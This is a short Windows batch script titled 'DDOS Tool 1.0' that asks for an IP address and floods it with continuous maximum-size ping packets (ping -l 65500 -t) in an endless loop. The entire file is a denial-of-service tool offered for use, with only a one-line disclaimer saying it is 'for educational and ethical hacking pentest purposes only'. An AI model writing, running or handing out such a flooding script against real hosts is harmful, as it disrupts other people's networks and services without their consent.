@echo off
color 02
set IPTOHACK=nothing
title DDOS Tool 1.0
:0
cls
echo DDOS Tool 1.0 - for educational and ethical hacking pentest purposes only
set /p IPTOHACK="Enter IP to DDOS: "
if "%IPTOHACK%"=="" goto 0
ping %IPTOHACK% -l 65500 -t
goto 0